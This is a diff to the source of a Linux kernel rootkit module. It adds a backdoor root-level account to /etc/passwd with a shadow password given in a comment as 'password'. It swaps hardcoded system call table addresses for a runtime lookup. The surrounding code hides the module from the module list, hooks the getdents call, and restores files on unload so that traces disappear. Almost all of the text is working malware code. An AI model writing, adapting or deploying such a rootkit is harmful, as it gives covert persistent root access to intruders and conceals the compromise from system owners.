@@ -24,7 +24,7 @@
 #define PF_INVISIBLE 0x10000000
 #define BACKDOOR_PASSWD "user1:x:12345:0:backdoor:/home:/bin/bash\n"
 
-#define BACKDOOR_SHADOW "user1:$1$MvZ75uo5$a2pTPgyDXrO6n.eyQjcmq0:16888:0:99999:7:::\n" // password is superman
+#define BACKDOOR_SHADOW "user1:$1$5RPVAd$9ybzwB9QcnuOV.SNKQWKX1:16888:0:99999:7:::\n" // password is password
 
 #define PASSWD "/etc/passwd"
 #define PASSWD_COPY "/tmp/passwd"
@@ -60,13 +60,13 @@ unsigned long* GetSysTable(void){
 //Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-116-generic
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
+//void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
+//void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 //We're getting its adddress from the System.map file (see above).
-static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
+//static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 
 //Function pointer will be used to save address of original 'open' syscall.
 //The asmlinkage keyword is a GCC #define that indicates this function
@@ -431,6 +431,8 @@ static int initialize_sneaky_module(void)
   list_del(&THIS_MODULE->list);
   mhide = 1;
  
+  
+  unsigned long *sys_call_table = GetSysTable();
   //getdents
   original_getdents = (void*)*(sys_call_table + __NR_getdents);  
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents; 
@@ -472,6 +474,8 @@ static void exit_sneaky_module(void)
   //restore passwd and shadow file
   restore_passwd(PASSWD_COPY, PASSWD);
   restore_passwd(SHADOW_COPY, SHADOW);
+
+  unsigned long *sys_call_table = GetSysTable();
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
